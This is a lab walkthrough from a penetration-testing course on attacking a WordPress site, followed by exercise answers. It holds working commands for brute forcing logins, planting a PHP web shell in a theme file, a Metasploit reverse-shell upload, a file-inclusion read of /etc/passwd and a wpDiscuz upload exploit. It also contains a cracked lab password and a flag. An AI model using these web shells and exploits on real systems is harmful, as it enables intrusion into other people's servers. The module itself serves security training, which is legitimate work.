# Attacking WordPress

We've confirmed that the company website is running on WordPress and have enumerated the version and installed plugins. Let's now look for attack paths and try to gain access to the internal network.

There are several ways we can abuse `built-in functionality` to attack a WordPress installation. We will cover login brute forcing against the `wp-login.php` page and remote code execution via the theme editor. These two tactics build on each other as we need first to obtain valid credentials for an administrator-level user to log in to the WordPress back-end and edit a theme.

***

### Login Bruteforce

WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john). The tool uses two kinds of login brute force attacks, [xmlrpc](https://kinsta.com/blog/xmlrpc-php/) and wp-login. The `wp-login` method will attempt to brute force the standard WordPress login page, while the `xmlrpc` method uses WordPress API to make login attempts through `/xmlrpc.php`. The `xmlrpc` method is preferred as it’s faster.

Attacking WordPress

```shell-session
AIceBear@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

[+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
[+] Started: Wed Aug 25 11:56:23 2021

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - john / firebird1                                                                                           
Trying john / bettyboop Time: 00:00:13 <                                      > (660 / 14345052)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: john, Password: firebird1

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Wed Aug 25 11:56:46 2021
[+] Requests Done: 799
[+] Cached Requests: 39
[+] Data Sent: 373.152 KB
[+] Data Received: 448.799 KB
[+] Memory used: 221 MB

[+] Elapsed time: 00:00:23
```

The `--password-attack` flag is used to supply the type of attack. The `-U` argument takes in a list of users or a file containing user names. This applies to the `-P` passwords option as well. The `-t` flag is the number of threads which we can adjust up or down depending. WPScan was able to find valid credentials for one user, `john:firebird1`.

***

### Code Execution

With administrative access to WordPress, we can modify the PHP source code to execute system commands. Log in to WordPress with the credentials for the `john` user, which will redirect us to the admin panel. Click on `Appearance` on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.

Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell.

Code: php

```php
system($_GET[0]);
```

The code above should let us execute commands via the GET parameter `0`. We add this single line to the file just below the comments to avoid too much modification of the contents.

![](https://academy.hackthebox.com/storage/modules/113/theme\_editor.png)

Click on `Update File` at the bottom to save. We know that WordPress themes are located at `/wp-content/themes/<theme name>`. We can interact with the web shell via the browser or using `cURL`. As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target.

Attacking WordPress

```shell-session
AIceBear@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The [wp\_admin\_shell\_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp\_admin\_shell\_upload/) module from Metasploit can be used to upload a shell and execute it automatically.

The module uploads a malicious plugin and then uses it to execute a PHP Meterpreter shell. We first need to set the necessary options.

Attacking WordPress

```shell-session
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```

We can then issue the `show options` command to ensure that everything is set up properly. In this lab example, we must specify both the vhost and the IP address, or the exploit will fail with the error `Exploit aborted due to failure: not-found: The target does not appear to be using WordPress`.

Attacking WordPress

```shell-session
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options 

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting           Required  Description
   ----       ---------------           --------  -----------
   PASSWORD   firebird1                 yes       The WordPress password to authenticate with
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.42.195             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                        yes       The target port (TCP)
   SSL        false                     no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                         yes       The base path to the wordpress application
   USERNAME   john                      yes       The WordPress username to authenticate with
   VHOST      blog.inlanefreight.local  no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
```

Once we are satisfied with the setup, we can type `exploit` and obtain a reverse shell. From here, we could start enumerating the host for sensitive data or paths for vertical/horizontal privilege escalation and lateral movement.

Attacking WordPress

```shell-session
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Authenticating with WordPress using doug:jessica1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/CczIptSXlr/wCoUuUPfIO.php...
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:42816) at 2021-09-20 19:43:46 -0400
i[+] Deleted wCoUuUPfIO.php
[+] Deleted CczIptSXlr.php
[+] Deleted ../CczIptSXlr

meterpreter > getuid

Server username: www-data (33)
```

In the above example, the Metasploit module uploaded the `wCoUuUPfIO.php` file to the `/wp-content/plugins` directory. Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail. During an assessment, we would want to make every attempt to clean up this artifact from the client system and, regardless of whether we were able to remove it or not, we should list this artifact in our report appendices. At the very least, our report should have an appendix section that lists the following information—more on this in a later module.

* Exploited systems (hostname/IP and method of exploitation)
* Compromised users (account name, method of compromise, account type (local or domain))
* Artifacts created on systems
* Changes (such as adding a local admin user or modifying group membership)

***

### Leveraging Known Vulnerabilities

Over the years, WordPress core has suffered from its fair share of vulnerabilities, but the vast majority of them can be found in plugins. According to the WordPress Vulnerability Statistics page hosted [here](https://wpscan.com/statistics), at the time of writing, there were 23,595 vulnerabilities in the WPScan database. These vulnerabilities can be broken down as follows:

* 4% WordPress core
* 89% plugins
* 7% themes

The number of vulnerabilities related to WordPress has grown steadily since 2014, likely due to the sheer amount of free (and paid) themes and plugins available, with more and more being added every week. For this reason, we must be extremely thorough when enumerating a WordPress site as we may find plugins with recently discovered vulnerabilities or even old, unused/forgotten plugins that no longer serve a purpose on the site but can still be accessed.

Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.

**Vulnerable Plugins - mail-masta**

Let's look at a few examples. The plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) is no longer supported but has had over 2,300 [downloads](https://wordpress.org/plugins/mail-masta/advanced/) over the years. It's not outside the realm of possibility that we could run into this plugin during an assessment, likely installed once upon a time and forgotten. Since 2016 it has suffered an [unauthenticated SQL injection](https://www.exploit-db.com/exploits/41438) and a [Local File Inclusion](https://www.exploit-db.com/exploits/50226).

Let's take a look at the vulnerable code for the mail-masta plugin.

Code: php

```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```

As we can see, the `pl` parameter allows us to include a file without any type of input validation or sanitization. Using this, we can include arbitrary files on the webserver. Let's exploit this to retrieve the contents of the `/etc/passwd` file using `cURL`.

Attacking WordPress

```shell-session
AIceBear@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
```

**Vulnerable Plugins - wpDiscuz**

[wpDiscuz](https://wpdiscuz.com/) is a WordPress plugin for enhanced commenting on page posts. At the time of writing, the plugin had over [1.6 million downloads](https://wordpress.org/plugins/wpdiscuz/advanced/) and over 90,000 active installations, making it an extremely popular plugin that we have a very good chance of encountering during an assessment. Based on the version number (7.0.4), this [exploit](https://www.exploit-db.com/exploits/49967) has a pretty good shot of getting us command execution. The crux of the vulnerability is a file upload bypass. wpDiscuz is intended only to allow image attachments. The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution. More on the mime type detection functions bypass can be found [here](https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/).

The exploit script takes two parameters: `-u` the URL and `-p` the path to a valid post.

Attacking WordPress

```shell-session
AIceBear@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[102476] | code:[200]
[!] Got wmuSecurity value: 5c9398fcdb
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: uthsdkbywoxeebg

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot; 

> id

[x] Failed to execute PHP code...
```

The exploit as written may fail, but we can use `cURL` to execute commands using the uploaded web shell. We just need to append `?cmd=` after the `.php` extension to run commands which we can see in the exploit script.

Attacking WordPress

```shell-session
AIceBear@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

In this example, we would want to make sure to clean up the `uthsdkbywoxeebg-1629904090.8191.php` file and once again list it as a testing artifact in the appendices of our report.

***

### Moving On

As we have seen from the last two sections, WordPress presents a vast attack surface. During our careers as penetration testers, we will almost definitely encounter WordPress many times. We must have the skills to quickly footprint a WordPress installation and perform thorough manual and tool-based enumeration to uncover high-risk misconfigurations and vulnerabilities. If these sections on WordPress were interesting, check out the [Attacking WordPress module](https://academy.hackthebox.com/course/preview/hacking-wordpress) for more practice.

**Questions**

Perform user enumeration against http://blog.inlanefreight.local. Aside from admin, what is the other user present?

```bash
wpscan --url http://blog.inlanefreight.local --enumerate --api-token API
[i] User(s) Identified:
[+] by:                                                                     admin
 | Found By: Author Posts - Display Name (Passive Detection)
[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
[+] doug
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Perform a login bruteforcing attack against the discovered user. Submit the user's password as the answer.

```bash
wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
[!] Valid Combinations Found:
 | Username: doug, Password: jessica1
```

Using the methods shown in this section, find another system user whose login shell is set to /bin/bash.

```bash
#login with credentials found above
#go to Appearance -> Theme Editor -> select theme Twenty Nineteen (unused one)
#on 404 Template
system($_GET[0]);
#now update it
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat+/etc/passwd
webadmin
```

Following the steps in this section, obtain code execution on the host and submit the contents of the flag.txt file in the webroot.

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=ls+/var/www/blog.inlanefreight.local
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=cat+/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt
l00k_ma_unAuth_rc3!
```
